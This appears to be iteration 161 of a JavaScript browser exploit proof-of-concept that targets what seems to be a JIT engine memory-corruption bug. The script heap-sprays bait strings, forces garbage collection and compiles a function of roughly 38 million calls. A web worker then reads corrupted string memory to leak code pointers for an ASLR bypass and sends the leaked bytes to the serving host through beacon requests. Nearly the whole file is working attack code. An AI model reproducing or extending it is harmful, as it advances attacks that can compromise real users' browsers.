// p161 — Fast detection + deep gradient scan
// FIX for p159: Worker detection uses ONLY .length check (like p156 which WORKED)
// After detection: scan charCodeAt extensively to find entry bytes in character data
//
// From corruption expert analysis:
//   - 108/112 entry bytes are ZERO. Only non-zero at:
//     entry+24: m_slowPathCallDestination (8B code pointer — ASLR LEAK!)
//     entry+64: bitfield flags (~2 bytes)
//     entry+68: m_bytecodeIndex (4 bytes, varies per entry)
//   - With gradient fill (byte N = N%256), entry overwrites are detectable:
//     charCodeAt(N) = 0 where (N%256) != 0 → overwritten by zero entry byte
//     charCodeAt(N) != (N%256) and != 0 → overwritten by non-zero entry byte (leaked data!)
//
// Beacon prefix: V161-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V161-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V161-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // Build gradient strings (byte N = N % 256)
        var gchunk = '';
        for (var i = 0; i < 256; i++) gchunk += String.fromCharCode(i);

        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 256) s += gchunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;

        // ── FAST DETECTION: .length ONLY (like p156) ──
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('LEN-' + i + '-' + targets[i].length);
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // ── DEEP EXTRACTION: scan all corrupted strings ──
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue;

          beacon('S' + i + '-len=' + len + '-hex=' + len.toString(16));

          // Clamp read range
          var maxRead = Math.min(len, 80000);
          if (maxRead <= 0) { beacon('S' + i + '-BADLEN'); continue; }

          // Scan for entry boundaries: find where gradient breaks
          // Entry bytes overwrite character data. Entry = 112 bytes.
          // 108/112 bytes are zero. Non-zero at entry+24(8B), +64(2B), +68(4B)
          var entryStarts = [];
          var nonGradient = [];

          // Scan first 2000 bytes exhaustively
          var scanLimit = Math.min(2000, maxRead);
          for (var b = 1; b < scanLimit; b++) {
            try {
              var ch = targets[i].charCodeAt(b);
              var expected = b % 256;
              if (ch !== expected) {
                nonGradient.push(b);
              }
            } catch(e) { break; }
          }

          beacon('NG' + i + '-count=' + nonGradient.length);

          if (nonGradient.length > 0) {
            // Report first 20 non-gradient positions and their values
            var ngHex = '';
            for (var n = 0; n < Math.min(20, nonGradient.length); n++) {
              var pos = nonGradient[n];
              try {
                ngHex += pos + ':' + hx(targets[i].charCodeAt(pos)) + ',';
              } catch(e) { break; }
            }
            beacon('ND' + i + '-' + ngHex.substring(0, 200));

            // Find first entry boundary (first non-gradient position)
            var entryBase = nonGradient[0];
            beacon('EB' + i + '-' + entryBase);

            // The code pointer is at entry+24 — read 8 bytes there
            var ptrOff = entryBase + 24;
            if (ptrOff + 8 <= maxRead) {
              var ptrHex = '';
              for (var pb = 7; pb >= 0; pb--) {
                try { ptrHex += hx(targets[i].charCodeAt(ptrOff + pb)); }
                catch(e) { ptrHex += 'XX'; }
              }
              beacon('CPTR' + i + '-off=' + ptrOff + '-' + ptrHex);
            }

            // Also read at entry+64 (flags) and entry+68 (bytecodeIndex)
            if (entryBase + 72 <= maxRead) {
              var flagsHex = hx(targets[i].charCodeAt(entryBase + 64)) +
                             hx(targets[i].charCodeAt(entryBase + 65));
              var bciHex = '';
              for (var bb = 3; bb >= 0; bb--) {
                try { bciHex += hx(targets[i].charCodeAt(entryBase + 68 + bb)); }
                catch(e) { bciHex += 'XX'; }
              }
              beacon('FL' + i + '-' + flagsHex + '-BCI-' + bciHex);
            }

            // Check the SECOND entry at entryBase+112
            var e2Base = entryBase + 112;
            if (e2Base + 72 <= maxRead) {
              var ptr2Hex = '';
              for (var pb = 7; pb >= 0; pb--) {
                try { ptr2Hex += hx(targets[i].charCodeAt(e2Base + 24 + pb)); }
                catch(e) { ptr2Hex += 'XX'; }
              }
              beacon('CPTR' + i + 'b-off=' + (e2Base + 24) + '-' + ptr2Hex);

              var bci2 = '';
              for (var bb = 3; bb >= 0; bb--) {
                try { bci2 += hx(targets[i].charCodeAt(e2Base + 68 + bb)); }
                catch(e) { bci2 += 'XX'; }
              }
              beacon('BCI' + i + 'b-' + bci2);
            }

            // Dump raw 112 bytes from entry start
            var rawA = '';
            for (var rb = 0; rb < Math.min(56, maxRead - entryBase); rb++) {
              try { rawA += hx(targets[i].charCodeAt(entryBase + rb)); }
              catch(e) { rawA += 'XX'; break; }
            }
            beacon('RAW' + i + 'a-' + rawA);
            var rawB = '';
            for (var rb = 56; rb < Math.min(112, maxRead - entryBase); rb++) {
              try { rawB += hx(targets[i].charCodeAt(entryBase + rb)); }
              catch(e) { rawB += 'XX'; break; }
            }
            beacon('RAW' + i + 'b-' + rawB);
          } else {
            // No non-gradient found in first 2000 bytes — scan deeper
            beacon('DEEP' + i);
            for (var b = 2000; b < Math.min(10000, maxRead); b += 112) {
              try {
                var ch = targets[i].charCodeAt(b);
                if (ch !== (b % 256)) {
                  beacon('DEEP' + i + '-hit=' + b + '-v=' + hx(ch));
                  break;
                }
              } catch(e) { break; }
            }
          }

          // Only process first 3 corrupted strings
          if (i >= 2) break;
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS — EXACTLY p156 ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v161fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v161ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v161ok ? 'OK' : 'FAIL'));
      if (!window.__v161fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v161fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
